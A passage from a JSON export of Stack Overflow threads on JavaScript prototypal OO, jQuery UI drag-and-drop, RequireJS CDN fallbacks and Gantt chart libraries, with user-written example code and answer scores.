}\n\n    that.purr = function(n) {\n        var str = '';\n\n        for(var i=0;i&lt;n;i++) {\n            if(i === 0) {\n                str = 'p-';\n            } else if(i === n-1) {\n                str += 'r';\n            } else {\n                str += 'r-';\n            }\n        }\n\n        return str\n    };\n\n    return that;\n}\n\n\nvar myMammal = Mammal();\nalert(myMammal.name());        //Alerts Mammal\nalert(myMammal.attributes());  //Alerts 'fur'\n\nvar myCat = Cat();\nalert(myCat.name());            //Alerts Cat\nalert(myCat.says());            //Alerts Meow\n\nvar toonces = Cat({\n    name : 'Toonces the Driving Cat',\n    food : ['Whiskas','ham'],\n    saying : 'Meeeooooowww',\n    fur_color : 'Black',\n    attributes : [ \n        'Can Drive a Car', 'Claws',\n        'fur','crazy eyes','long tail',\n        'Steals Hub Caps',\n    ],\n});\n\nalert(toonces.name());            //Alerts 'Toonces the Driving Cat'\nalert(toonces.says());            //Alerts 'Meeooooowww'\nalert(toonces.eats());            //Alerts 'Whiskas, ham'\nalert(toonces.fur_color());       //Alerts 'Black'\nalert(toonces.attributes());      //Alerts 'Can Drive a Car, Claws,\n                                  //fur, crazy eyes, long tail,\n                                  // Steals Hub Caps',\nalert(toonces.purr(5));           //Alerts 'p-r-r-r-r'\n</code></pre>\n\n<p><strong>EDIT</strong>:  I was alerted that I did not use the \"prototype\" object.  I did this, as to avoid HAVING to use the \"new\" operator, as mentioned in the text above.  For completeness, I will give an example using the prototype object below...</p>\n\n<p><strong>Inheritance with the Prototype Object</strong></p>\n\n<pre><code>//Building a class to use the prototype object\nvar Dog = function(spec) {\n\nvar that = this;\n\n//Private Methods\n\n    //Have to redefine this since\n    //I decided to use this as an\n    //example of a private method\n    function extend(obj1,obj2) {\n        for(var key in obj2) {\n            obj1[key] = obj2[key];\n        }\n    }\n\n    //Private Variables\n    //New list of defaults\n    var defaults = {\n        name : 'Dog',\n        saying : 'Woof',\n        food : ['bacon'],\n        fur_color : 'Default Fur Color',\n        attributes : ['fur','Barks at Mailman'],\n    }\n\n\n    //Attach the properties of a Mammal to \"self\"\n    this.self = new Mammal(defaults);\n\n    //Add a function to get the name\n    this.getName = function() {\n        return that.self.name();\n    }\n}\n\n//Extend the prototype\nDog.prototype.growl = \"grrrrrrr\";\n\n//Make a new dog...HAVE TO CALL NEW HERE OR ELSE BAD THINGS CAN HAPPEN\nd= new Dog();\n\nalert(d.growl);            //Alerts 'grrrrrrr'\nalert(d.getName());        //Alerts 'Dog'\nalert(d.self.says());      //Alerts 'Woof'\n</code></pre>\n\n<p>Please feel free to ask me about any of this post.  Enjoy.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I'm currently using a inheritance plugin model which attempts to combine the prototypical OO pattern with jQuery plugin pattern. Its posted in detail in my answer here: <a href=\"http://stackoverflow.com/questions/6307918/attaching-a-class-to-a-jquery-object/6311706#6311706\">attaching a class to a jQuery object</a></p>\n\n<p><strong>Note:</strong> Do not get turned away by mention of the word <code>Class</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>In my framework, everything is an object or an \"interface\".</p>\n\n<p>Interfaces define the common functions (methods / property_gets / property_sets) that objects may have.</p>\n\n<p>You create an interface like this: <code>var some_interface = GetInterface(constructor, interface_setup, parent_interface..)</code></p>\n\n<p>You can specify any number of parent_interfaces. So if <code>interface_A</code> inherits both <code>interface_B</code> and <code>interface_C</code>, you can create interface_A as such: <code>GetInterface(constructor, interface_setup, interface_B, interface_C);</code></p>\n\n<p>If <code>interface_A</code> inherits <code>interface_X</code> and <code>interface_X</code> inherits <code>interface_Y</code>, then <code>interface_A</code> will have all the functions which both <code>interface_X</code> and <code>interface_Y</code> has.</p>\n\n<p>Interfaces which do not require a constructor will leave the constructor argument as null. The interface_setup is a function which looks like this:</p>\n\n<pre><code>function(proto){\n}\n</code></pre>\n\n<p>The object that the <em>proto</em> argument points to has 4 methods: <code>SetM</code>, <code>ShadowM</code>, <code>SetP</code>, and <code>ShadowP</code>.</p>\n\n<p>You use these 4 methods to <em>setup</em> your interface.</p>\n\n<p>This framework also provides lazy instantiation of interfaces. (in other words the setup code will never actually be ran until it is actually first needed).</p>\n\n<p>Limitations of this framework requires at least support for <code>Object.keys</code>, <code>Object.getOwnPropertyDescriptor</code> and <code>Object.defineProperty</code>. (In other words it works in the latest versions of FireFox, IE, Chrome, Safari but not Opera)</p>\n\n<p><strong>TestPage2.html:</strong></p>\n\n<pre><code>&lt;!doctype html&gt;\n&lt;script src=\"js.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\nvar human = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing human\");\n    proto.$SetM(\"Sleep\",function(){\n        alert(this.Name+\" is sleeping\");\n    });\n    proto.$SetP(\"Name\",function(){\n        return this._name;\n    },function(value){\n        this._name=value;\n    });\n});\n\nvar female = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing female\");\n    proto.$SetM(\"Dance\",function(){\n        alert(this.Name+\" is dancing\");\n    });\n},human);\n\nvar male = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing male\");\n    proto.$SetM(\"Fight\",function(){\n        alert(this.Name+\" is fighting\");\n    });\n    proto.$ShadowP(\"Name\",function(parent_get){\n        return \"Mr. \"+parent_get();\n    },function(parent_set,value){\n        parent_set(value);\n    });\n},human);\n\nvar child = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing child\");\n    proto.$SetM(\"Play\",function(){\n        alert(this.Name+\" is playing\");\n    });\n},human);\n\nvar adult = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing adult\");\n    proto.$SetM(\"Work\",function(){\n        alert(this.Name+\" is working\");\n    });\n},human);\n\nvar mammal = GetInterface(function(){\n},function(proto){\n    //alert(\"trace: initing mammal\");\n    proto.$SetM(\"DoMammalStuff\",function(){\n        alert(\"doing mammal stuff\");\n    });\n});\n\n\nvar john=new male();\njohn.Name=\"john\";\njohn.Sleep();\n\nvar mary=new female();\nmary.$IsA(child);\nmary.$IsA(mammal);\nmary.$Setup(function(proto){\n    proto.$ShadowP(\"Name\",function(parent_get){\n        return \"Miss \"+parent_get.call(this);\n    },function(parent_set,value){\n        parent_set.call(this,value);\n    });\n});\nmary.Name=\"mary\";\nmary.Play();\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>TestPage.html:</strong></p>\n\n<pre><code> &lt;!doctype html&gt;\n&lt;script src=\"js.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\nvar human_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing human\");\n    proto.$SetM(\"Sleep\",function(){\n        alert(this.Name+\" is sleeping\");\n    });\n    proto.$SetP(\"Name\",function(){\n        return this._name;\n    },function(value){\n        this._name=value;\n    });\n});\n\nvar female_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing female\");\n    proto.$SetM(\"Dance\",function(){\n        alert(this.Name+\" is dancing\");\n    });\n},human_interface);\n\nvar male_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing male\");\n    proto.$SetM(\"Fight\",function(){\n        alert(this.Name+\" is fighting\");\n    });\n},human_interface);\n\nvar child_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing child\");\n    proto.$SetM(\"Play\",function(){\n        alert(this.Name+\" is playing\");\n    });\n},human_interface);\n\nvar adult_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing adult\");\n    proto.$SetM(\"Work\",function(){\n        alert(this.Name+\" is working\");\n    });\n},human_interface);\n\nvar mammal_interface = GetInterface(function(){\n},function(proto){\n    alert(\"trace: initing mammal\");\n    proto.$SetM(\"DoMammalStuff\",function(){\n        alert(\"doing mammal stuff\");\n    });\n});\n\nvar john={};\njohn.$IsA(adult_interface);\n//the above 2 lines are equal to simply doing:\n//var john=new adult_interface();\n//you can think of it as a shortcut\njohn.$IsA(mammal_interface);\njohn.DoMammalStuff();\njohn.Name=\"john\";\njohn.Sleep();\n\nvar mary=new female_interface();\nmary.$IsA(child_interface);\nmary.$IsA(mammal_interface);\nmary.DoMammalStuff();\nmary.Name=\"mary\";\nmary.Play();\nmary.Dance();\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>Js.js:</strong></p>\n\n<pre><code>\"use strict\";\nvar GetInterface;\n(function(){\n    //================================================================================//\n    //(constructor:Function, setup:Function?, parent_interfaces:Function..):Function\n    GetInterface = function (constructor, setup) {\n        var parent_classes = GetParray(arguments, 2);\n        var output = function () {\n            output.$Init();\n            for (var x = parent_classes.length - 1; x &gt;= 0; --x) {\n                parent_classes[x](this);\n            }\n            if(constructor===null){\n                constructor.apply(this, arguments);\n            }\n        };\n        output.$Init = Mize(function () {\n            var output_proto = output.prototype;\n            parent_classes.forEach(function (parent_class) {\n                parent_class.$Init();\n                Infect(output_proto, parent_class.prototype);\n            });\n            init_proto(output_proto,setup);\n            if(setup!==undefined){\n                setup(output_proto);\n            }\n        });\n        return output;\n    };\n    var init_proto=function(proto){\n        $defineProperty(proto, \"$SetM\", { value: set_m, writable: true, configurable: true });\n        $defineProperty(proto, \"$ShadowM\", { value: shadow_m, writable: true, configurable: true });\n        $defineProperty(proto, \"$SetP\", { value: set_p, writable: true, configurable: true });\n        $defineProperty(proto, \"$ShadowP\", { value: shadow_p, writable: true, configurable: true });\n    };\n    var set_m = function (method_name, method) {\n        this[method_name] = method;\n    };\n    var set_p = function (property_name, getter, setter) {\n        $defineProperty(this, property_name, { get: getter, set: setter, enumerable: true, configurable: true });\n    };\n    var shadow_m = function (method_name, supplied_method) {\n        var old_method = this[method_name];\n        this[method_name] = function () {\n            var args = GetParray(arguments);\n            args.unshift(old_method.bind(this));\n            supplied_method.apply(this, args);\n        };\n    };\n    var shadow_p = function (property_name, getter, setter) {\n        var old_descriptor = $getOwnPropertyDescriptor(this, property_name);\n        var old_get = old_descriptor.get;\n        var old_set = old_descriptor.set;\n        $defineProperty(this, property_name, { get: function () {\n            return getter.call(this, old_get.bind(this));\n        }, set: function (value) {\n            setter.call(this, old_set.bind(this), value);\n        }, enumerable: true, configurable: true\n        });\n    };\n    var $slice=Array.prototype.slice;\n    var $defineProperty=Object.defineProperty;\n    var $getOwnPropertyDescriptor=Object.getOwnPropertyDescriptor;\n    if($defineProperty===undefined){\n        throw \"Object.defineProperty, Object.getOwnPropertyDescriptor, Object.keys are required\";\n    }\n    //================================================================================//\n    //(victim:Object, disease:Object):void\n    var Infect=function (victim, disease, excludes) {\n        var keys=Object.keys(disease);\n        if(excludes!==undefined){\n            excludes.forEach(function(exclude){\n                ForEach(keys,function(key,x){\n                    if(key===exclude){\n                        keys.splice(x,1);\n                        return false;\n                    }\n                });\n            });\n        }\n        keys.forEach(function(key){\n            $defineProperty(victim, key, $getOwnPropertyDescriptor(disease, key));\n        });\n    };\n    //================================================================================//\n    //(args:Object # arguments object #, start_index:int?):Array\n    var GetParray = function (args, start_index) {\n        if (start_index === undefined) {\n            start_index = 0;\n        }\n        return $slice.call(args, start_index);\n    };\n    //================================================================================//\n    //(array:Array, f:Function(item:Object|null, index:pint):boolean?):Object\n    var ForEach=function(array,f){\n        for (var x = 0, xx = array.length, last_index=xx-1; x &lt; xx; ++x) {\n            var result = f(array[x], x, last_index);\n            if (result !== undefined) {\n                return result;\n            }\n        }\n    };\n    //================================================================================//\n    //provides memoization.\n    //(f:Function, arity_fixed:boolean?true):Function\n    //caching is done according to the inputs. the results of calling function(undefined) and function() are cached differently.\n    //if arity is fixed, optimizations can be done\n    var Mize=function(f, arity_fixed) {\n        if (arity_fixed === undefined) {\n            arity_fixed = true;\n        }\n        var used; //for 0 arg\n        var result; //for 0 arg\n        var results; //for &gt;0 args\n        var used_params; //for 1 arg\n        var used_param_sets; //for &gt;1 args\n        var f_length = f.length;\n        var use_generic = !arity_fixed || f_length &gt; 3;\n        if (use_generic) { //if `f_length` &lt;= 3, it will be optimized (i.e. not using generic function)\n            results = [];\n            used_param_sets = [];\n            return function () {\n                var params = GetParray(arguments);\n                var result_found = false;\n                var result = ForEach(used_param_sets,function (used_param_set, x) {\n                    if (used_param_set.length === params.length) {\n                        var params_match = true;\n                        ForEach(params,function (param, y) {\n                            if (used_param_set[y] !== param) {\n                                params_match = false;\n                                return false;\n                            }\n                        });\n                        if (params_match) {\n                            result_found = true;\n                            return results[x];\n                        }\n                    }\n                });\n                if (!result_found) {\n                    used_param_sets.push(params);\n                    result = f.apply(null, params);\n                    results.push(result);\n                }\n                return result;\n            };\n        }\n        if (f_length === 0) {\n            used = false;\n            return function () {\n                if (!used) {\n                    result = f();\n                    used = true;\n                }\n                return result;\n            };\n        }\n        if (f_length === 1) {\n            used_params = [];\n        } else {\n            used_param_sets = [];\n        }\n        results = [];\n        switch (f_length) {\n            case 1:\n                return function (arg) {\n                    var result_found = false;\n                    var result = ForEach(used_params,function (used_param, x) {\n                        if (arg === used_param) {\n                            result_found = true;\n                            return results[x];\n                        }\n                    });\n                    if (!result_found) {\n                        used_params.push(arg);\n                        result = f(arg);\n                        results.push(result);\n                    }\n                    return result;\n                };\n                break;\n            case 2:\n                return function (arg1, arg2) {\n                    var result_found = false;\n                    var result = ForEach(used_param_sets,function (used_param_set, x) {\n                        if (arg1 === used_param_set[0] &amp;&amp; arg2 === used_param_set[1]) {\n                            result_found = true;\n                            return results[x];\n                        }\n                    });\n                    if (!result_found) {\n                        used_param_sets.push([arg1, arg2]);\n                        result = f(arg1, arg2);\n                        results.push(result);\n                    }\n                    return result;\n                };\n                break;\n            case 3:\n                return function (arg1, arg2, arg3) {\n                    var result_found = false;\n                    var result = ForEach(used_param_sets,function (used_param_set, x) {\n                        if (arg1 === used_param_set[0] &amp;&amp; arg2 === used_param_set[1] &amp;&amp; arg3 === used_param_set[2]) {\n                            result_found = true;\n                            return results[x];\n                        }\n                    });\n                    if (!result_found) {\n                        used_param_sets.push([arg1, arg2, arg3]);\n                        result = f(arg1, arg2, arg3);\n                        results.push(result);\n                    }\n                    return result;\n                };\n                break;\n            default:\n                throw \"Invalid `f_length`: \" + f_length;\n        }\n    };\n    //================================================================================//\n    Object.prototype.$Setup=function(setup){\n        setup(Object.getPrototypeOf(this));\n    };\n    //================================================================================//\n    Object.prototype.$IsA=function(_interface){\n        var excludes=GetParray(arguments,1);\n        if(this.$SetM===undefined){\n            this.$SetM=set_m;\n            this.$SetP=set_p;\n            this.$ShadowM=shadow_m;\n            this.$ShadowP=shadow_p;\n        }\n        _interface.$Init();\n        /*var this_proto={};\n        init_proto(this_proto);\n        Infect(this_proto,Object.getPrototypeOf(this));\n        this.__proto__=this_proto;*/\n        Infect(Object.getPrototypeOf(this),_interface.prototype,excludes);\n    };\n    //================================================================================//\n})();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Have you taken a look at OMeta/JS? OMeta is an experimental research pattern matching language based on Smalltalk and Self. OMeta/JS is an implementation in javascript using prototypical OO. </p>\n\n<p>It is well commented and documented with many examples. It is also on Github.</p>\n\n<p><a href=\"http://tinlizzie.org/ometa-js/\" rel=\"nofollow\">http://tinlizzie.org/ometa-js/</a></p>\n\n<p><a href=\"https://github.com/alexwarth/ometa-js\" rel=\"nofollow\">https://github.com/alexwarth/ometa-js</a></p>\n\n<p>Edit: OMeta is the result of Alexander Warth's PhD disertation.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p><strong>Bounty Edit:</strong></p>\n\n<p>I'm looking for code written in a <em>pure</em> prototypical OO paradigm (think Self). Not a mixture of prototypical OO and classical OO. I don't want to see generic OO wrappers but simply usage of prototypical OO techniques and <em>only</em> prototypical OO techniques.</p>\n\n<p><strong>Reference Related Question:</strong></p>\n\n<p><a href=\"http://stackoverflow.com/questions/6526241/prototypical-oo-in-javascript\">Prototypical OO in JavaScript</a></p>\n\n<p>In the above question I mainly focused on </p>\n\n<blockquote>\n  <p>Can write prototypical OO like this?</p>\n  \n  <p>Do we need constructors and initialization logic, What are the alternatives?</p>\n</blockquote>\n\n<p><strong>New question:</strong></p>\n\n<p>Basically are there any <em>good examples of javascript prototypical</em> OO in large open source projects?</p>\n\n<p><strong>Clarification:</strong></p>\n\n<p>I will have to clarify what I mean with <strong>prototypical OO</strong> :</p>\n\n<ul>\n<li>There are no classes. There are only Objects.</li>\n<li><strong>There is <em>zero</em> emulation of the concepts of classes,</strong> again there is only objects and cloning objects to create new objects.</li>\n</ul>\n\n<p><strong>Further Clarification of Prototypical OO:</strong></p>\n\n<p>The difference between prototypical OO in JavaScript and classical OO emulation is a <em>very grey area</em>. It's not that I <em>value</em> avoiding classical OO. I want to learn prototypical OO in an academic fashion in it's own right, without learning the (probably more optimum) combination of classical OO emulation and prototypical OO.</p>\n\n<p>This is why I \"ban\" classes, just so that I can see these techniques in a pure fashion and extend my own OO tool kit. </p>\n\n<p><strong>Examples:</strong></p>\n\n<p>Popular examples like jQuery fail to meet the second criteria. The <code>jQuery</code> object is one big class emulation. It focuses on creating new objects from a class rather then cloning existing objects. </p>\n\n<p>If I actually knew any example of using <em>\"pure\"</em> prototypical OO I would have shown you. I believe 99% of JavaScript OO is too heavily influenced by classical emulation.</p>\n\n<p><strong>Bonus points</strong> </p>\n\n<p>If </p>\n\n<ul>\n<li>It's well comented / documented</li>\n<li>Has unit tests</li>\n<li>Is on github.</li>\n</ul>\n\n<p>I will also accept articles / tutorials and examples on how to write prototypical OO code that goes beyond your trivial hello world application.</p>\n",
            "last_activity_date": 1314893811,
            "question_id": 6534333,
            "score": 27,
            "tags": [
                "javascript",
                "oop",
                "prototypal-inheritance",
                "ecmascript-5",
                "prototypal"
            ],
            "title": "(Open Source) Examples of JavaScript Prototypical OO"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Taking the full javascript code from the link you gave, you can change it as follows to make it work:</p>\n\n<pre><code>$(function() {\n    $(\".elementbar div\").draggable({\n    \tconnectToSortable: '.column',\n    \tcursor: 'move',\n    \tcursorAt: { top: 0, left: 0 },\n    \thelper: 'clone',\n    \trevert: 'invalid'\n    });\n    $(\".elementbar div, .elementbar div img\").disableSelection();\n    $(\".column\").sortable({\n    \tconnectWith: '.column',\n    \tcursor: 'move', \n    \tcursorAt: { top: 0, left: 0 }, \n    \tplaceholder: 'ui-sortable-placeholder',\n    \ttolerance: 'pointer',\n    \tstop: function(event, ui) {\n    \t\tif (ui.item.hasClass(\"elemtxt\")) {\n    \t\t\tui.item.replaceWith('&lt;div class=\"element element-txt\"&gt;This text box has been added!&lt;/div&gt;');\n    \t\t}\n    \t}\n    });\n    $(\".element\").addClass(\"ui-widget ui-widget-content ui-helper-clearfix ui-corner-all\");\n});\n</code></pre>\n\n<p>There were a couple of issues:</p>\n\n<ol>\n<li>The drop event (that you show in your question) wasn't firing because you weren't <code>accept</code>ing the right content.</li>\n<li>If you have both <code>.sortable</code> &amp; <code>.droppable</code> you end up with weird double events firing. This is unnecessary anyway, since you can effectively grab the drop event from sortable's events given that you've linked it with the draggable.</li>\n</ol>\n\n<p>One other thing to note - it would have been nicer to use the sortable's <code>receive</code> event instead of <code>stop</code> (since stop gets fired every time any sorting stops &amp; receive is specifically there to fire when you drop a new item into the sort list), but it doesn't work properly because the <code>item</code> hasn't yet been added to the sortable list, so you aren't able to change it at that point. It works ok on stop simply because none of the other sortable items have the <code>elemtxt</code> class.</p>\n",
                    "is_accepted": true,
                    "score": 47
                }
            ],
            "body": "<p>When using jQuery UI draggables and droppables, how do you change the dragged-and-dropped element on drop? I am trying to drag one DIV to another sortable DIV. On drop, I'd like to change the classes on the dropped DIV and change its innerHTML content.</p>\n\n<p>After reading various StackOverflow questions, my code looks like this:</p>\n\n<pre><code>$(\".column\").droppable({\n  accept: '.element-dragging', \n\tdrop: function(event, ui) {\n\t\tif ($(ui.draggable).hasClass(\"elemtxt\")) {\n\t\t\t$(ui.draggable).replaceWith('&lt;div class=\"element element-txt\"&gt;This text box has been added!&lt;/div&gt;');\n\t\t}\n\t}\n})\n</code></pre>\n\n<p>It's not working for me. :-(</p>\n\n<p>A full copy of my code is located at <a href=\"http://www.marteki.com/jquery/bugkilling.php\">http://www.marteki.com/jquery/bugkilling.php</a>.</p>\n",
            "last_activity_date": 1248227788,
            "question_id": 1162487,
            "score": 25,
            "tags": [
                "javascript",
                "jquery",
                "jquery-ui",
                "drag-and-drop"
            ],
            "title": "Using jQuery UI drag-and-drop: changing the dragged element on drop"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>What version of RequireJS are you using?  It seems you might want to configure jQuery's fallback as a path in your config, then set up jQuery as a dependency on the other modules that need it.  If you're using ~> 2.0, something like (untested):</p>\n\n<pre><code>// in your requirejs config\nrequirejs.config({\n    //To get timely, correct error triggers in IE, force a define/shim exports \n    // check.\n    enforceDefine: true,\n    paths: {\n        jquery: [\n            'http://somecdn.com/jquery.min', // your cdn\n            'lib/jquery' // your fallback\n        ],\n        jqueryui: \"http://somecdn.com/jquery-ui.min.js\"\n    },\n    shim: {\n      jqueryui: ['jquery']\n    }\n});\n\n// then in your requires\nrequire([jquery, jqueryui, foo, bar], function($) {\n    // stuff\n});\n</code></pre>\n\n<p>They talk about how to do it <a href=\"https://github.com/jrburke/requirejs/wiki/Upgrading-to-RequireJS-2.0#wiki-pathsfallbacks\">in the wiki</a>.  If you are not using v2.x, there is a method for handling that here too.</p>\n\n<p>If all the modules are configured to specify their own dependencies, you shouldn't need to worry about the <code>order!</code> directives either.</p>\n",
                    "is_accepted": true,
                    "score": 46
                },
                {
                    "body": "<p>I have found a solution to the problem provided in RequireJS 2.x.x. There was a demand for this solution, so in turn, RequireJS added a <code>paths</code> object to their config. This provides fallback functionality for CDNs, should they fail.</p>\n\n<p>It should also be noted that the <code>order!</code> plugin has been deprecated in Require 2.0, so I also needed to make use of the <code>shim</code> object to define dependencies. It's actually a pretty interesting idea.</p>\n\n<p>Here is my new require.config:</p>\n\n<pre><code>require.config({\n    urlArgs: \"ts=\"+new Date().getTime(), // disable caching - remove in production\n    paths: {\n        jquery: [\n            \"http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min\",\n            \"libs/jquery\"\n        ],\n        jqueryui: [\n            \"http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min\",\n            \"libs/jqueryui\"\n        ],\n        underscore: [\n            \"http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.3.3/underscore-min\",\n            \"libs/underscore\"\n        ],\n        backbone: [\n            \"http://cdnjs.cloudflare.com/ajax/libs/backbone.js/0.9.2/backbone-min\",\n            \"libs/backbone\"\n        ]\n    },\n    shim: {\n        'jqueryui': ['jquery'],\n        'underscore': ['jquery'],\n        'backbone': ['underscore'],\n        'core/core': ['underscore'],\n        'core/errors': ['core/core'],\n        'core/constants': ['core/core']\n    }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 14
                }
            ],
            "body": "<p>In my backbone app, I need to provide a fallback for each required file, in the case that the CDN that delivers them fails.</p>\n\n<p>I have tried overwriting <code>require.onError</code> like so:</p>\n\n<pre><code>require.onError = function (err) {\n    if (err.requireType === 'timeout') {\n        var url = err.requireModules;\n\n        if (!!~url.indexOf(\"jquery/\"))\n            console.warn(\"CDN timed out, falling back to local jQuery.js\")\n            require([\"libs/jquery\"]);\n            return;\n        if (!!~url.indexOf(\"jqueryui/\"))\n            console.warn(\"CDN timed out, falling back to local jQueryUI.js\")\n            require([\"libs/jqueryui\"]);\n            return;\n        if (!!~url.indexOf(\"underscore\"))\n            console.warn(\"CDN timed out, falling back to local underscore.js\")\n            require([\"libs/underscore\"]);\n            return;\n        if (!!~url.indexOf(\"backbone\"))\n            console.warn(\"CDN timed out, falling back to local backbone.js\")\n            require([\"libs/backbone\"]);\n            return;\n    }\n}\n</code></pre>\n\n<p>The problem is that this will asynchronously load the fallback files. I need these files to load in order, just like the original require statement, where I use the <code>order!</code> plugin.</p>\n\n<p>With the overridden <code>onError</code>: when the CDN fails to load, the fallback load is started, but not waited for. This presents a problem because the scripts are ordered to be loaded based on their dependencies. Here is a look at my original <code>require</code> statement, that depends on the CDN:</p>\n\n<pre><code>require([\n    \"order!http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js\",\n    \"order!http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js\",\n    \"order!http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.3.3/underscore-min.js\",\n    \"order!http://cdnjs.cloudflare.com/ajax/libs/backbone.js/0.9.2/backbone-min.js\",\n    \"order!utils/date\",\n    \"order!core/core\",\n    \"order!core/errors\",\n    \"order!core/constants\"\n], function() {\n    ...\n}\n</code></pre>\n",
            "last_activity_date": 1345645541,
            "question_id": 12073768,
            "score": 20,
            "tags": [
                "javascript",
                "requirejs",
                "cdn"
            ],
            "title": "RequireJS: Local fallback for if CDN fails"
        },
        {
            "answer_count": 12,
            "answers": [
                {
                    "body": "<p>For Gantt chart generation see:</p>\n\n<ul>\n<li><a href=\"http://www.mechanicalcat.net/tech/pytaskplan/\" rel=\"nofollow\">http://www.mechanicalcat.net/tech/pytaskplan/</a></li>\n<li><a href=\"http://www.strout.net/python/piddle/\" rel=\"nofollow\">http://www.strout.net/python/piddle/</a></li>\n<li><a href=\"http://opensched.sourceforge.net/\" rel=\"nofollow\">http://opensched.sourceforge.net/</a></li>\n</ul>\n\n<p>or there are general charting libs like</p>\n\n<ul>\n<li><a href=\"http://matplotlib.sourceforge.net/\" rel=\"nofollow\">http://matplotlib.sourceforge.net/</a></li>\n<li><a href=\"http://home.gna.org/pychart/\" rel=\"nofollow\">http://home.gna.org/pychart/</a></li>\n</ul>\n\n<p>or may be just use <a href=\"http://www.gnuplot.info/\" rel=\"nofollow\">gnuplot</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Maybe you can get some impressions of how it could be done by these examples:</p>\n\n<ul>\n<li><a href=\"http://www.yuml.me/\" rel=\"nofollow\">http://www.yuml.me/</a></li>\n<li><a href=\"http://creately.com/\" rel=\"nofollow\">http://creately.com/</a></li>\n<li><a href=\"http://www.chartle.net/\" rel=\"nofollow\">http://www.chartle.net/</a></li>\n<li><a href=\"http://www.lovelycharts.com/\" rel=\"nofollow\">http://www.lovelycharts.com/</a></li>\n<li><a href=\"http://www.icharts.net/\" rel=\"nofollow\">http://www.icharts.net/</a></li>\n<li><a href=\"https://scrumy.com/\" rel=\"nofollow\">https://scrumy.com/</a></li>\n<li><a href=\"http://chartgizmo.com/\" rel=\"nofollow\">http://chartgizmo.com/</a></li>\n<li><a href=\"http://www.archimy.com/\" rel=\"nofollow\">http://www.archimy.com/</a></li>\n<li><a href=\"http://www.gliffy.com/\" rel=\"nofollow\">http://www.gliffy.com/</a></li>\n</ul>\n\n<p>I hope these are enough for some inspiration.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Have a look at the <a href=\"http://code.google.com/p/flot/\" rel=\"nofollow\">flot jQuery plugin</a>:</p>\n\n<blockquote>\n  <p>Flot is a pure Javascript plotting library for jQuery. It produces graphical plots of arbitrary datasets on-the-fly client-side.</p>\n  \n  <p>The focus is on simple usage (all settings are optional), attractive looks and interactive features like zooming and mouse tracking.</p>\n</blockquote>\n\n<p>The library can produce bar graphs, and is used by our host site - have a look at Stack Overflow <a href=\"http://stackoverflow.com/users/6491/gimel?tab=reputation&amp;sort=graph\">Reputation History</a> page.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>see also <a href=\"http://teethgrinder.co.uk/open-flash-chart/index.php\" rel=\"nofollow\">Open Flash Chart</a>\nit gives support helpers also for the most popular programming languages.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You could use FusionWidget at <a href=\"http://www.fusioncharts.com/widgets/gallery.asp\" rel=\"nofollow\">http://www.fusioncharts.com/widgets/gallery.asp</a>. It's not free, but its Gantt chart works greatly for me.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Have a look at <a href=\"http://www.ext-scheduler.com\" rel=\"nofollow\">http://www.ext-scheduler.com</a>. 100% JavaScript, based on ExtJS. Disclaimer: I wrote it.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>For me, the best is <a href=\"http://gantter.com/\">http://gantter.com/</a> you don't need registration process, it exports to msproject or pdf.... perfect!</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I like this one, is still under development, \"use it at your own risk\" but it's very drag and drop</p>\n\n<p><a href=\"http://ganttapp.appspot.com\" rel=\"nofollow\">http://ganttapp.appspot.com</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Try one of this:</p>\n\n<p><a href=\"http://dhtmlx.com/docs/products/dhtmlxGantt/index.shtml\" rel=\"nofollow\">http://dhtmlx.com/docs/products/dhtmlxGantt/index.shtml</a> - neat chart, option to edit tasks, one serious drawback: lacks timescale change</p>\n\n<p><a href=\"http://dojotoolkit.org/reference-guide/dojox/gantt.html\" rel=\"nofollow\">http://dojotoolkit.org/reference-guide/dojox/gantt.html</a> - free (!!), quite nice, but very hard to customize (unless you modify the source code)</p>\n\n<p><a href=\"http://bryntum.com/gantt/\" rel=\"nofollow\">http://bryntum.com/gantt/</a> - so far, one of my favourites - very easy to customize, but licensing for commercial projects is unclear, you can download trial for 45 days</p>\n\n<p><a href=\"http://www.tgantt.com/treegrid/www/Gantt.html\" rel=\"nofollow\">http://www.tgantt.com/treegrid/www/Gantt.html</a> - actually, this one looks like a space vessel's dashboard and so it is to configure, still struggling to put this in my application</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
